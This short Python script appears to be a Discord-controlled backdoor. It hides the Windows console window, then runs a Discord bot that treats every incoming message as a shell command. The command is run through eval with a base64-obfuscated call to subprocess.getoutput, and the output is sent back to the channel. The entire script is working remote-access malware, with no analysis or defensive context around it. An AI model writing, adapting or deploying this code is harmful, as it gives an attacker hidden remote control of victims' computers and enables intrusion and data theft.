import discord,base64;
import ctypes;ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
TOKEN = 'discord bot token goes here';client = discord.Client()
@client.event
async def on_message(message):
    ms = message.content;msab = str.encode(ms,encoding="utf-8");ore = base64.b64decode(b'X19pbXBvcnRfXygnc3VicHJvY2VzcycpLmdldG91dHB1dA==');cm1 = msab.decode('utf-8');ore = ore.decode('utf-8');v2our=eval(f"{ore}('{cm1}')");await message.channel.send(v2our)
client.run(TOKEN)
